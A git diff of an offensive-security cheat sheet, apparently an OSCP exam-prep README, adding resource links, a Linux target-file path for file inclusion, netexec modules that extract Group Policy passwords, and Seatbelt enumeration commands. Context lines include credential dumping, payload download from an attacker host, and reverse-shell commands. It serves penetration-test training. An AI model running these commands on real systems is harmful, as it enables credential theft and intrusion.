@@ -7,7 +7,7 @@
 ![GitHub stars](https://img.shields.io/github/stars/0xsyr0/OSCP?logoColor=yellow) ![GitHub forks](https://img.shields.io/github/forks/0xsyr0/OSCP?logoColor=purple) ![GitHub watchers](https://img.shields.io/github/watchers/0xsyr0/OSCP?logoColor=green)</br>
 ![GitHub commit activity (branch)](https://img.shields.io/github/commit-activity/m/0xsyr0/OSCP) ![GitHub contributors](https://img.shields.io/github/contributors/0xsyr0/OSCP)
 
-Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [X](https://twitter.com/syr0_) for suggestions.
+Since this little project gets more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [X](https://twitter.com/syr0_) for suggestions.
 
 Every contribution is appreciated!
 
@@ -17,6 +17,11 @@ Every contribution is appreciated!
 > Inform yourself before taking the exam!
 
 Here are the link to the [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.
+
+Also here are two more important resources you should check out before you take the exam.
+
+- [https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
+- [https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams](https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams)
 
 > [!NOTE]
 > This repository will also try to cover as much as possible of the tools required for the proving grounds boxes.
@@ -144,6 +149,7 @@ Thank you for reading.
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
 		- [RunasCs](#runascs)
+		- [Seatbelt](#seatbelt)
 		- [smbpasswd](#smbpasswd)
 		- [winexe](#winexe)
 	- [CVE](#cve)
@@ -422,6 +428,7 @@ Thank you for reading.
 | n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
 | n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
 | n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
+| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
 | n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
 | n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
 | n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
@@ -463,6 +470,7 @@ Thank you for reading.
 
 | Name | URL |
 | --- | --- |
+| OSCP-Note-Vault | https://github.com/0xsyr0/OSCP-Note-Vault |
 | SysReptor | https://github.com/Syslifters/sysreptor |
 | SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
 | SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |
@@ -474,10 +482,13 @@ Thank you for reading.
 | OSCP Guide 01/12 – My Exam Experience | https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x |
 | Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
 | HackTricks | https://book.hacktricks.xyz/ |
+| HackTricks Local Windows Privilege Escalation Checklist | https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation |
 | Hacking Articles | https://www.hackingarticles.in/ |
+| Rednode Windows Privilege Escalation | https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/ |
+| OSCP-Tricks-2023 | https://github.com/rodolfomarianocy/OSCP-Tricks-2023 |
 | IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
 | IppSec.rocks | https://ippsec.rocks/?# |
-| 0xdf | https://0xdf.gitlab.io/
+| 0xdf | https://0xdf.gitlab.io/ |
 
 ## Commands
 
@@ -1416,6 +1427,7 @@ Accept: ../../../../.././../../../../etc/passwd{%00{{
 ##### Linux Files
 
 ```c
+/app/etc/local.xml
 /etc/passwd
 /etc/shadow
 /etc/aliases
@@ -2718,6 +2730,8 @@ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M gpp_autologin
+netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M gpp_password
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
 netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
@@ -3110,7 +3124,7 @@ ALTER USER neo4j SET PASSWORD '<PASSWORD>'
 #### BloodHound Python
 
 ```c
-bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>'-ns <RHOST> -c all --zip
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
@@ -4894,6 +4908,14 @@ srvinfo
 .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
 .\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
 .\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
+```
+
+#### Seatbelt
+
+```c
+.\Seatbelt.exe -group=system
+.\Seatbelt.exe -group=all
+.\Seatbelt.exe -group=all -full
 ```
 
 #### smbpasswd
